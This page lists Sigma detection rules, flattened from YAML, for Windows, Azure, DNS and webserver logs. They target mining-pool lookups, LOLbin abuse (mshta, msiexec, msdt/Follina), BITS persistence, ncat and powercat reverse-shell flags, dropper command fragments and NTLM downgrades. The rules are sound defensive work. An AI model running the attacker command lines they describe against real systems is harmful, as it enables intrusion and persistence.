<li><a href="#">title:Monero Crypto Coin Mining Pool Lookup id: b593fd50-7335-4682-a36c-4edcb68e4641 status: stable description: Detects suspicious DNS queries to Monero mining pools author: Florian Roth date: 2021/10/24 references: - logsource: category: dns detection: selection: query|contains: - 'pool.minexmr.com' - 'fr.minexmr.com' - 'de.minexmr.com' - 'sg.minexmr.com' - 'ca.minexmr.com' - 'us-west.minexmr.com' - 'pool.supportxmr.com' - 'mine.c3pool.com' - 'xmr-eu1.nanopool.org' - 'xmr-eu2.nanopool.org' - 'xmr-us-east1.nanopool.org' - 'xmr-us-west1.nanopool.org' - 'xmr-asia1.nanopool.org' - 'xmr-jp1.nanopool.org' - 'xmr-au1.nanopool.org' - 'xmr.2miners.com' - 'xmr.hashcity.org' - 'xmr.f2pool.com' - 'xmrpool.eu' - 'pool.hashvault.pro' condition: selection falsepositives: - Legitimate crypto coin mining tags: - attack.impact - attack.t1496 - attack.t1567 level: high 
<li><a href="#">title:Monitoring For Persistence Via BITS id: b9cbbc17-d00d-4e3d-a827-b06d03d2380d description: BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished. When the job runs on the system the command specified in the BITS job will be executed. This can be abused by actors to create a backdoor within the system and for persistence. It will be chained in a BITS job to schedule the download of malware/additional binaries and execute the program after being downloaded status: experimental author: Sreeman date: 2020/10/29 modified: 2022/03/07 references: - - - logsource: product: windows category: process_creation detection: selection_1: CommandLine|contains|all: - 'bitsadmin' - '/SetNotifyCmdLine' CommandLine|contains: - '%COMSPEC%' - 'cmd.exe' - 'regsvr32.exe' selection_2: CommandLine|contains|all: - 'bitsadmin' - '/Addfile' CommandLine|contains: - 'http:' - 'https:' - 'ftp:' - 'ftps:' condition: 1 of selection_* falsepositives: - Unknown fields: - CommandLine level: medium tags: - attack.defense_evasion - attack.t1197 
<li><a href="#">title:Monitoring Winget For LOLbin Execution id: 313d6012-51a0-4d93-8dfc-de8553239e25 description: Adversaries can abuse winget to download payloads remotely and execute them without touching disk. Winget will be included by default in Windows 10 and is already available in Windows 10 insider programs. The manifest option enables you to install an application by passing in a YAML file directly to the client. Winget can be used to download and install exe's, msi, msix files later. status: experimental references: - author: Sreeman, Florian Roth, Frack113 date: 2020/04/21 modified: 2022/01/11 tags: - attack.defense_evasion - attack.execution - attack.t1059 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'winget' - 'install' CommandLine|contains: - '-m ' - '--manifest' condition: selection falsepositives: - Admin activity installing packages not in the official Microsoft repo. Winget probably won't be used by most users. fields: - CommandLine level: medium 
<li><a href="#">title:Moriya Rootkit id: 25b9c01c-350d-4b95-bed1-836d04a4f324 description: Detects the use of Moriya rootkit as described in the securelist's Operation TunnelSnake report status: experimental author: Bhabesh Raj date: 2021/05/06 modified: 2021/11/30 references: - tags: - attack.persistence - attack.privilege_escalation - attack.t1543.003 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ServiceName: ZzNetSvc condition: selection level: critical falsepositives: - Unknown 
<li><a href="#">title:Moriya Rootkit id: a1507d71-0b60-44f6-b17c-bf53220fdd88 related: - id: 25b9c01c-350d-4b95-bed1-836d04a4f324 type: derived description: Detects the use of Moriya rootkit as described in the securelist's Operation TunnelSnake report status: experimental author: Bhabesh Raj date: 2021/05/06 modified: 2021/09/21 references: - tags: - attack.persistence - attack.privilege_escalation - attack.t1543.003 logsource: product: windows category: file_event detection: selection: TargetFilename: 'C:\Windows\System32\drivers\MoriyaStreamWatchmen.sys' condition: selection level: critical falsepositives: - Unknown 
<li><a href="#">title:Mounted Share Deleted id: cb7c4a03-2871-43c0-9bbb-18bbdb079896 status: test description: Detects when when a mounted share is removed. Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation author: 'oscd.community, @redcanary, Zach Stanford @svch0st' references: - date: 2020/10/08 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\net.exe' Image|endswith: '\net1.exe' CommandLine|contains|all: - 'share' - '/delete' condition: selection falsepositives: - Administrators or Power users may remove their shares via cmd line level: low tags: - attack.defense_evasion - attack.t1070.005 
<li><a href="#">title:Mounted Windows Admin Shares with net.exe id: 3abd6094-7027-475f-9630-8ab9be7b9725 status: experimental description: Detects when an admin share is mounted using net.exe references: - author: 'oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st, wagga' date: 2020/10/05 modified: 2021/06/27 tags: - attack.lateral_movement - attack.t1021.002 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\net.exe' - '\net1.exe' CommandLine|contains|all: - ' use ' - '\\\*\\*$' # (Specs) If some wildcard after a backslash should be searched, the backslash has to be escaped: \\* condition: selection falsepositives: - Administrators level: medium 
<li><a href="#">title:Mouse Lock Credential Gathering id: c9192ad9-75e5-43eb-8647-82a0a5b493e3 status: test description: In Kaspersky's 2020 Incident Response Analyst Report they listed legitimate tool "Mouse Lock" as being used for both credential access and collection in security incidents. author: Cian Heasley references: - - date: 2020/08/13 modified: 2021/11/27 logsource: product: windows category: process_creation detection: selection: - Product|contains: 'Mouse Lock' - Company|contains: 'Misc314' - CommandLine|contains: 'Mouse Lock_' condition: selection fields: - Product - Company - CommandLine falsepositives: - Legitimate uses of Mouse Lock software level: medium tags: - attack.credential_access - attack.collection - attack.t1056.002 
<li><a href="#">title:MpiExec Lolbin id: 729ce0ea-5d8f-4769-9762-e35de441586d status: experimental description: Detects a certain command line flag combination used by mpiexec.exe LOLBIN from HPC pack that can be used to execute any other binary references: - - tags: - attack.execution - attack.defense_evasion - attack.t1218 author: Florian Roth date: 2022/01/11 modified: 2022/03/04 logsource: category: process_creation product: windows detection: selection_binary: - Image|endswith: '\mpiexec.exe' - Imphash: 'd8b52ef6aaa3a81501bdfff9dbb96217' - Hashes|contains: 'IMPHASH=d8b52ef6aaa3a81501bdfff9dbb96217' selection_flags: CommandLine|contains: - ' /n 1 ' - ' -n 1 ' condition: all of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:MS Office Product Spawning Exe in User Dir id: aa3a6f94-890e-4e22-b634-ffdfd54792cc status: experimental description: Detects an executable in the users directory started from Microsoft Word, Excel, Powerpoint, Publisher or Visio references: - sha256=23160972c6ae07f740800fa28e421a81d7c0ca5d5cab95bc082b4a986fbac57c - tags: - attack.execution - attack.t1204.002 - attack.g0046 - car.2013-05-002 author: Jason Lynch date: 2019/04/02 modified: 2022/06/02 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - '\WINWORD.EXE' - '\EXCEL.EXE' - '\POWERPNT.exe' - '\MSPUB.exe' - '\VISIO.exe' - '\MSACCESS.exe' - '\EQNEDT32.exe' # - '\OUTLOOK.EXE' too many FPs Image|startswith: 'C:\users\' Image|endswith: '.exe' filter: Image|endswith: '\Teams.exe' condition: selection and not filter fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:MSDT Executed with Suspicious Parent id: 7a74da6b-ea76-47db-92cc-874ad90df734 status: experimental description: Detects msdt.exe executed by a suspicious parent as seen in CVE-2022-30190 / Follina exploitation author: Nextron Systems references: - - date: 2022/06/01 modified: 2022/06/02 tags: - attack.defense_evasion - attack.t1036 - attack.t1218 logsource: category: process_creation product: windows detection: selection_parent: ParentImage|endswith: - '\powershell.exe' - '\cmd.exe' - '\mshta.exe' - '\cscript.exe' - '\wscript.exe' - '\wsl.exe' - '\rundll32.exe' - '\regsvr32.exe' # office apps are covered by other rules selection_msdt: - Image|endswith: '\msdt.exe' - OriginalFileName: 'msdt.exe' condition: all of selection_* falsepositives: - Unknown level: high 
<li><a href="#">title:MSDT.EXE Execution With Suspicious Cab Option id: dc4576d4-7467-424f-9eee-fd2b02855fe0 status: experimental description: Detects execution of msdt.exe using the "cab" flag which could indicates suspicious diagcab files with embedded answer files leveraging CVE-2022-30190 author: Nasreddine Bencherchali references: - date: 2022/06/21 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\msdt.exe' - OriginalFileName: 'msdt.exe' selection_cmd: CommandLine|contains: - ' /cab ' - ' -cab ' condition: all of selection_* falsepositives: - Legitimate usage of ".diagcab" files level: medium tags: - attack.defense_evasion - attack.t1202 
<li><a href="#">title:MSDT.exe Loading Diagnostic Library id: ec8c4047-fad9-416a-8c81-0f479353d7f6 status: experimental description: Detects both of CVE-2022-30190 / Follina and DogWalk vulnerability exploiting msdt.exe binary to load sdiageng.dll binary author: Greg (rule) references: - date: 2022/06/17 logsource: category: image_load product: windows detection: selection_img: Image|endswith: '\msdt.exe' selection_load: ImageLoaded|endswith: '\sdiageng.dll' condition: all of selection* falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1202 - cve.2022.30190 
<li><a href="#">title:MSExchange Transport Agent Installation id: 4fe151c2-ecf9-4fae-95ae-b88ec9c2fca6 related: - id: 83809e84-4475-4b69-bc3e-4aad8568612f type: derived status: experimental description: Detects the Installation of a Exchange Transport Agent references: - tags: - attack.persistence - attack.t1505.002 author: Tobias Michalski date: 2021/06/08 modified: 2021/09/19 logsource: product: windows service: msexchange-management detection: selection: - 'Install-TransportAgent' condition: selection fields: - AssemblyPath falsepositives: - Legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator for this. level: medium 
<li><a href="#">title:MSExchange Transport Agent Installation id: 83809e84-4475-4b69-bc3e-4aad8568612f status: experimental description: Detects the Installation of a Exchange Transport Agent references: - tags: - attack.persistence - attack.t1505.002 author: Tobias Michalski date: 2021/06/08 modified: 2021/09/19 logsource: product: windows category: process_creation detection: selection: CommandLine|contains: 'Install-TransportAgent' condition: selection falsepositives: - Legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator for this. level: medium fields: - AssemblyPath 
<li><a href="#">title:Mshta JavaScript Execution id: 67f113fa-e23d-4271-befa-30113b3e08b1 status: test description: Identifies suspicious mshta.exe commands. author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community references: - - date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\mshta.exe' CommandLine|contains: 'javascript' condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1218.005 
<li><a href="#">title:MSHTA Spawning Windows Shell id: 03cc0c25-389f-4bf8-b48d-11878079f1ca status: test description: Detects a Windows command line executable started from MSHTA author: Michael Haag references: - date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\mshta.exe' selection2: - Image|endswith: - '\cmd.exe' - '\powershell.exe' - '\wscript.exe' - '\cscript.exe' - '\sh.exe' - '\bash.exe' - '\reg.exe' - '\regsvr32.exe' - Image|contains: - '\BITSADMIN' condition: selection and selection2 fields: - CommandLine - ParentCommandLine falsepositives: - Printer software / driver installations - HP software level: high tags: - attack.defense_evasion - attack.t1218.005 - car.2013-02-003 - car.2013-03-001 - car.2014-04-003 
<li><a href="#">title:MSHTA Spwaned by SVCHOST id: ed5d72a6-f8f4-479d-ba79-02f6a80d7471 status: test description: Detects MSHTA.EXE spwaned by SVCHOST as seen in LethalHTA and described in report author: Markus Neis references: - date: 2018/06/07 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\svchost.exe' Image|endswith: '\mshta.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1218.005 
<li><a href="#">title:MSHTA Suspicious Execution 01 id: cc7abbd0-762b-41e3-8a26-57ad50d2eea3 status: test description: Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism author: Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule) references: - - - - - date: 2019/02/22 modified: 2021/12/01 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\mshta.exe' CommandLine|contains: - 'vbscript' - '.jpg' - '.png' - '.lnk' # - '.chm' # could be prone to false positives - '.xls' - '.doc' - '.zip' - '.dll' - '.exe' condition: selection1 falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: high tags: - attack.defense_evasion - attack.t1140 - attack.t1218.005 - attack.execution - attack.t1059.007 - cve.2020.1599 
<li><a href="#">title:Msiexec Initiated Connection id: 8e5e38e4-5350-4c0b-895a-e872ce0dd54f status: experimental description: | Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi) author: frack113 references: - - date: 2022/01/16 logsource: category: network_connection product: windows detection: selection: Initiated: 'true' Image|endswith: '\msiexec.exe' condition: selection falsepositives: - Legitimate msiexec over networks level: medium tags: - attack.defense_evasion - attack.t1218.007 
<li><a href="#">title:MsiExec Web Install id: f7b5f842-a6af-4da5-9e95-e32478f3cd2f status: test description: Detects suspicious msiexec process starts with web addresses as parameter author: Florian Roth references: - date: 2018/02/09 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - ' msiexec' - '://' condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium tags: - attack.defense_evasion - attack.t1218.007 - attack.command_and_control - attack.t1105 
<li><a href="#">title:Msra.exe Process Injection id: 744a188b-0415-4792-896f-11ddb0588dbc status: experimental description: Detects process injection using Microsoft Remote Asssistance (Msra.exe) which has been used for discovery and persistence tactics author: Alexander McDonald date: 2022/06/24 references: - - logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\msra.exe' ParentCommandLine|endswith: 'msra.exe' Image|endswith: - '\arp.exe' - '\cmd.exe' - '\net.exe' - '\netstat.exe' - '\nslookup.exe' - '\route.exe' - '\schtasks.exe' - '\whoami.exe' condition: selection falsepositives: - Legitimate use of Msra.exe level: high tags: - attack.defense_evasion - attack.t1055 
<li><a href="#">title:MSTSC Shadowing id: 6ba5a05f-b095-4f0a-8654-b825f4f16334 status: test description: Detects RDP session hijacking by using MSTSC shadowing author: Florian Roth references: - - date: 2020/01/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'noconsentprompt' - 'shadow:' condition: selection falsepositives: - Unknown level: high tags: - attack.lateral_movement - attack.t1563.002 
<li><a href="#">title:Multifactor Authentication Denied id: e40f4962-b02b-4192-9bfe-245f7ece1f99 status: experimental author: AlertIQ date: 2022/03/24 description: User has indicated they haven't instigated the MFA prompt and could indicate an attacker has the password for the account. references: - logsource: product: azure service: signinlogs detection: selection: AuthenticationRequirement: 'multiFactorAuthentication' Status|contains: 'MFA Denied' condition: selection level: medium falsepositives: - Users actually login but miss-click into the Deny button when MFA prompt. tags: - attack.initial_access - attack.t1078.004 
<li><a href="#">title:Multifactor Authentication Interupted id: 5496ff55-42ec-4369-81cb-00f417029e25 status: experimental author: AlertIQ date: 2021/10/10 description: Identifies user login with multifactor authentication failures, which might be an indication an attacker has the password for the account but can't pass the MFA challenge. references: - logsource: product: azure service: signinlogs detection: selection: ResultType: 50074 ResultDescription|contains: 'Strong Auth required' selection1: ResultType: 500121 ResultDescription|contains: 'Authentication failed during strong authentication request' condition: selection or selection1 level: medium falsepositives: - Unknown tags: - attack.initial_access - attack.t1078.004 
<li><a href="#">title:Multiple Modsecurity Blocks id: a06eea10-d932-4aa6-8ba9-186df72c8d23 status: stable description: Detects multiple blocks by the mod_security module (Web Application Firewall) author: Florian Roth date: 2017/02/28 logsource: product: linux service: modsecurity detection: selection: - 'mod_security: Access denied' - 'ModSecurity: Access denied' - 'mod_security-message: Access denied' timeframe: 120m condition: selection falsepositives: - Vulnerability scanners - Frequent attacks if system faces Internet level: medium tags: - attack.impact - attack.t1499 
<li><a href="#">title:Multiple Suspicious Resp Codes Caused by Single Client id: 6fdfc796-06b3-46e8-af08-58f3505318af status: test description: Detects possible exploitation activity or bugs in a web application author: Thomas Patzke date: 2017/02/19 modified: 2021/11/27 logsource: category: webserver detection: selection: sc-status: - 400 - 401 - 403 - 500 timeframe: 10m condition: selection fields: - client_ip - vhost - url - response falsepositives: - Unstable application - Application that misuses the response codes level: medium tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:Multiple Users Attempting To Authenticate Using Explicit Credentials id: 196a29c2-e378-48d8-ba07-8a9e61f7fab9 description: Detects a source user failing to authenticate with multiple users using explicit credentials on a host. status: experimental author: Mauricio Velazco date: 2021/06/01 modified: 2021/08/09 references: - tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection1: EventID: 4648 timeframe: 24h condition: - selection1 falsepositives: - Terminal servers - Jump servers - Other multiuser systems like Citrix server farms - Workstations with frequently changing users level: medium 
<li><a href="#">title:Multiple Users Failing to Authenticate from Single Process id: fe563ab6-ded4-4916-b49f-a3a8445fe280 description: Detects failed logins with multiple accounts from a single process on the system. status: experimental author: Mauricio Velazco date: 2021/06/01 modified: 2021/07/07 references: - - tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection1: EventID: 4625 LogonType: 2 filter: ProcessName: '-' timeframe: 24h condition: - selection1 and not filter falsepositives: - Terminal servers - Jump servers - Other multiuser systems like Citrix server farms - Workstations with frequently changing users level: medium 
<li><a href="#">title:Multiple Users Remotely Failing To Authenticate From Single Source id: add2ef8d-dc91-4002-9e7e-f2702369f53a description: Detects a source system failing to authenticate against a remote host with multiple users. status: experimental author: Mauricio Velazco references: - date: 2021/06/01 modified: 2021/07/09 tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection1: EventID: 4625 LogonType: 3 filter: IpAddress: '-' timeframe: 24h condition: selection1 and not filter falsepositives: - Terminal servers - Jump servers - Other multiuser systems like Citrix server farms - Workstations with frequently changing users level: medium 
<li><a href="#">title:Mustang Panda Dropper id: 2d87d610-d760-45ee-a7e6-7a6f2a65de00 status: test description: Detects specific process parameters as used by Mustang Panda droppers author: Florian Roth, oscd.community references: - - - date: 2019/10/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: - CommandLine|contains: - 'Temp\wtask.exe /create' - '%windir:~-3,1%%PUBLIC:~-9,1%' - '/tn "Security Script ' - '%windir:~-1,1%' - CommandLine|contains|all: - '/E:vbscript' - 'C:\Users\' - '.txt' - '/F' selection2: Image|endswith: 'Temp\winwsh.exe' condition: 1 of selection* fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: high tags: - attack.t1587.001 - attack.resource_development 
<li><a href="#">title:Narrator's Feedback-Hub Persistence id: f663a6d9-9d1b-49b8-b2b1-0637914d199a status: test description: Detects abusing Windows 10 Narrator's Feedback-Hub author: Dmitriy Lifanov, oscd.community references: - date: 2019/10/25 modified: 2022/03/26 logsource: category: registry_event product: windows detection: selection1: EventType: DeleteValue TargetObject|endswith: '\AppXypsaf9f1qserqevf0sws76dx4k9a5206\Shell\open\command\DelegateExecute' selection2: TargetObject|endswith: '\AppXypsaf9f1qserqevf0sws76dx4k9a5206\Shell\open\command\(Default)' #add the payload in the (Default) condition: 1 of selection* falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Ncat Execution id: e31033fc-33f0-4020-9a16-faf9b31cbf08 status: experimental author: frack113, Florian Roth date: 2021/07/21 modified: 2022/02/23 description: Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network references: - - tags: - attack.command_and_control - attack.t1095 logsource: category: process_creation product: windows detection: selection: # can not use OriginalFileName as is empty Image|endswith: - '\ncat.exe' - '\netcat.exe' selection_cmdline: # Typical command lines CommandLine|contains: - ' -lvp ' - ' -lvnp' - ' -l -v -p ' - ' -lv -p ' - ' -l --proxy-type http ' - ' --exec cmd.exe ' - ' -vnl --exec ' condition: selection or selection_cmdline falsepositives: - Legitimate ncat use level: high 
<li><a href="#">title:Net WebClient Casing Anomalies id: c86133ad-4725-4bd0-8170-210788e0a7ba status: experimental description: Detects PowerShell command line contents that include a suspicious anormal casing in the Net.Webclient (e.g. nEt.WEbCliEnT) string as used in obfuscation techniques author: Florian Roth references: - date: 2022/05/24 tags: - attack.execution - attack.t1059.001 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\powershell.exe' encoded: CommandLine|contains: - 'TgBlAFQALgB3AEUAQg' - '4AZQBUAC4AdwBFAEIA' - 'OAGUAVAAuAHcARQBCA' - 'bgBFAHQALgB3AGUAYg' - '4ARQB0AC4AdwBlAGIA' - 'uAEUAdAAuAHcAZQBiA' - 'TgBFAHQALgB3AGUAYg' - 'OAEUAdAAuAHcAZQBiA' - 'bgBlAFQALgB3AGUAYg' - '4AZQBUAC4AdwBlAGIA' - 'uAGUAVAAuAHcAZQBiA' - 'TgBlAFQALgB3AGUAYg' - 'OAGUAVAAuAHcAZQBiA' - 'bgBFAFQALgB3AGUAYg' - '4ARQBUAC4AdwBlAGIA' - 'uAEUAVAAuAHcAZQBiA' - 'bgBlAHQALgBXAGUAYg' - '4AZQB0AC4AVwBlAGIA' - 'uAGUAdAAuAFcAZQBiA' - 'bgBFAHQALgBXAGUAYg' - '4ARQB0AC4AVwBlAGIA' - 'uAEUAdAAuAFcAZQBiA' - 'TgBFAHQALgBXAGUAYg' - 'OAEUAdAAuAFcAZQBiA' - 'bgBlAFQALgBXAGUAYg' - '4AZQBUAC4AVwBlAGIA' - 'uAGUAVAAuAFcAZQBiA' - 'TgBlAFQALgBXAGUAYg' - 'OAGUAVAAuAFcAZQBiA' - 'bgBFAFQALgBXAGUAYg' - '4ARQBUAC4AVwBlAGIA' - 'uAEUAVAAuAFcAZQBiA' - 'bgBlAHQALgB3AEUAYg' - '4AZQB0AC4AdwBFAGIA' - 'uAGUAdAAuAHcARQBiA' - 'TgBlAHQALgB3AEUAYg' - 'OAGUAdAAuAHcARQBiA' - 'bgBFAHQALgB3AEUAYg' - '4ARQB0AC4AdwBFAGIA' - 'uAEUAdAAuAHcARQBiA' - 'TgBFAHQALgB3AEUAYg' - 'OAEUAdAAuAHcARQBiA' - 'bgBlAFQALgB3AEUAYg' - '4AZQBUAC4AdwBFAGIA' - 'uAGUAVAAuAHcARQBiA' - 'TgBlAFQALgB3AEUAYg' - 'OAGUAVAAuAHcARQBiA' - 'bgBFAFQALgB3AEUAYg' - '4ARQBUAC4AdwBFAGIA' - 'uAEUAVAAuAHcARQBiA' - 'TgBFAFQALgB3AEUAYg' - 'OAEUAVAAuAHcARQBiA' - 'bgBlAHQALgBXAEUAYg' - '4AZQB0AC4AVwBFAGIA' - 'uAGUAdAAuAFcARQBiA' - 'TgBlAHQALgBXAEUAYg' - 'OAGUAdAAuAFcARQBiA' - 'bgBFAHQALgBXAEUAYg' - '4ARQB0AC4AVwBFAGIA' - 'uAEUAdAAuAFcARQBiA' - 'TgBFAHQALgBXAEUAYg' - 'OAEUAdAAuAFcARQBiA' - 'bgBlAFQALgBXAEUAYg' - '4AZQBUAC4AVwBFAGIA' - 'uAGUAVAAuAFcARQBiA' - 'TgBlAFQALgBXAEUAYg' - 'OAGUAVAAuAFcARQBiA' - 'bgBFAFQALgBXAEUAYg' - '4ARQBUAC4AVwBFAGIA' - 'uAEUAVAAuAFcARQBiA' - 'TgBFAFQALgBXAEUAYg' - 'OAEUAVAAuAFcARQBiA' - 'bgBlAHQALgB3AGUAQg' - '4AZQB0AC4AdwBlAEIA' - 'uAGUAdAAuAHcAZQBCA' - 'TgBlAHQALgB3AGUAQg' - 'OAGUAdAAuAHcAZQBCA' - 'bgBFAHQALgB3AGUAQg' - '4ARQB0AC4AdwBlAEIA' - 'uAEUAdAAuAHcAZQBCA' - 'TgBFAHQALgB3AGUAQg' - 'OAEUAdAAuAHcAZQBCA' - 'bgBlAFQALgB3AGUAQg' - '4AZQBUAC4AdwBlAEIA' - 'uAGUAVAAuAHcAZQBCA' - 'TgBlAFQALgB3AGUAQg' - 'OAGUAVAAuAHcAZQBCA' - 'bgBFAFQALgB3AGUAQg' - '4ARQBUAC4AdwBlAEIA' - 'uAEUAVAAuAHcAZQBCA' - 'TgBFAFQALgB3AGUAQg' - 'OAEUAVAAuAHcAZQBCA' - 'bgBlAHQALgBXAGUAQg' - '4AZQB0AC4AVwBlAEIA' - 'uAGUAdAAuAFcAZQBCA' - 'TgBlAHQALgBXAGUAQg' - 'OAGUAdAAuAFcAZQBCA' - 'bgBFAHQALgBXAGUAQg' - '4ARQB0AC4AVwBlAEIA' - 'uAEUAdAAuAFcAZQBCA' - 'TgBFAHQALgBXAGUAQg' - 'OAEUAdAAuAFcAZQBCA' - 'bgBlAFQALgBXAGUAQg' - '4AZQBUAC4AVwBlAEIA' - 'uAGUAVAAuAFcAZQBCA' - 'TgBlAFQALgBXAGUAQg' - 'OAGUAVAAuAFcAZQBCA' - 'bgBFAFQALgBXAGUAQg' - '4ARQBUAC4AVwBlAEIA' - 'uAEUAVAAuAFcAZQBCA' - 'TgBFAFQALgBXAGUAQg' - 'OAEUAVAAuAFcAZQBCA' - 'bgBlAHQALgB3AEUAQg' - '4AZQB0AC4AdwBFAEIA' - 'uAGUAdAAuAHcARQBCA' - 'TgBlAHQALgB3AEUAQg' - 'OAGUAdAAuAHcARQBCA' - 'bgBFAHQALgB3AEUAQg' - '4ARQB0AC4AdwBFAEIA' - 'uAEUAdAAuAHcARQBCA' - 'TgBFAHQALgB3AEUAQg' - 'OAEUAdAAuAHcARQBCA' - 'bgBlAFQALgB3AEUAQg' - 'uAGUAVAAuAHcARQBCA' - 'bgBFAFQALgB3AEUAQg' - '4ARQBUAC4AdwBFAEIA' - 'uAEUAVAAuAHcARQBCA' - 'TgBFAFQALgB3AEUAQg' - 'OAEUAVAAuAHcARQBCA' - 'TgBlAHQALgBXAEUAQg' - '4AZQB0AC4AVwBFAEIA' - 'OAGUAdAAuAFcARQBCA' - 'bgBFAHQALgBXAEUAQg' - '4ARQB0AC4AVwBFAEIA' - 'uAEUAdAAuAFcARQBCA' - 'TgBFAHQALgBXAEUAQg' - 'OAEUAdAAuAFcARQBCA' - 'bgBlAFQALgBXAEUAQg' - '4AZQBUAC4AVwBFAEIA' - 'uAGUAVAAuAFcARQBCA' - 'TgBlAFQALgBXAEUAQg' - 'OAGUAVAAuAFcARQBCA' - 'bgBFAFQALgBXAEUAQg' - '4ARQBUAC4AVwBFAEIA' - 'uAEUAVAAuAFcARQBCA' condition: selection and encoded falsepositives: - Unknown level: high 
<li><a href="#">title:Net.exe Execution id: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac status: experimental description: Detects execution of Net.exe, whether suspicious or benign. references: - - - - - author: Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community (improvements) date: 2019/01/16 modified: 2021/12/06 tags: - attack.discovery - attack.t1007 - attack.t1049 - attack.t1018 - attack.t1135 - attack.t1201 - attack.t1069.001 - attack.t1069.002 - attack.t1087.001 - attack.t1087.002 - attack.lateral_movement - attack.t1021.002 - attack.s0039 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\net.exe' - '\net1.exe' cmdline: CommandLine|contains: - ' group' - ' localgroup' - ' user' - ' view' - ' share' - ' accounts' - ' stop ' - ' start' condition: selection and cmdline fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Will need to be tuned. If using Splunk, I recommend | stats count by Computer,CommandLine following the search for easy hunting by computer/CommandLine. level: low 
<li><a href="#">title:Net.exe User Account Creation id: cd219ff3-fa99-45d4-8380-a7d15116c6dc status: test description: Identifies creation of local users via the net.exe command. author: Endgame, JHasenbusch (adapted to Sigma for oscd.community) references: - - date: 2018/10/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\net.exe' - '\net1.exe' CommandLine|contains|all: - 'user' - 'add' condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Legitimate user creation. - Better use event IDs for user creation rather than command line rules. level: medium tags: - attack.persistence - attack.t1136.001 
<li><a href="#">title:Netcat The Powershell Version id: bf7286e7-c0be-460b-a7e8-5b2e07ecc2f2 status: experimental author: frack113 date: 2021/07/21 modified: 2021/10/16 description: Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network references: - - - tags: - attack.command_and_control - attack.t1095 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection: ContextInfo|contains: - 'powercat ' - 'powercat.ps1' condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Netcat The Powershell Version id: c5b20776-639a-49bf-94c7-84f912b91c15 related: - id: bf7286e7-c0be-460b-a7e8-5b2e07ecc2f2 type: derived status: experimental author: frack113 date: 2021/07/21 modified: 2021/10/16 description: Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network references: - - - tags: - attack.command_and_control - attack.t1095 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: selection: HostApplication|contains: - 'powercat ' - 'powercat.ps1' condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:NetNTLM Downgrade Attack id: d3abac66-f11c-4ed0-8acb-50cc29c97eed related: - id: d67572a0-e2ec-45d6-b8db-c100d14b8ef2 type: derived description: Detects NetNTLM downgrade attack status: experimental references: - author: Florian Roth, wagga date: 2018/03/20 modified: 2021/06/27 tags: - attack.defense_evasion - attack.t1562.001 - attack.t1112 # Windows Security Eventlog: Process Creation with Full Command Line logsource: product: windows service: security definition: 'Requirements: Audit Policy : Object Access > Audit Registry (Success)' detection: selection: EventID: 4657 ObjectName|contains|all: - '\REGISTRY\MACHINE\SYSTEM' - 'ControlSet' - '\Control\Lsa' ObjectValueName: - 'LmCompatibilityLevel' - 'NtlmMinClientSec' - 'RestrictSendingNTLMTraffic' condition: selection falsepositives: - Unknown level: high 
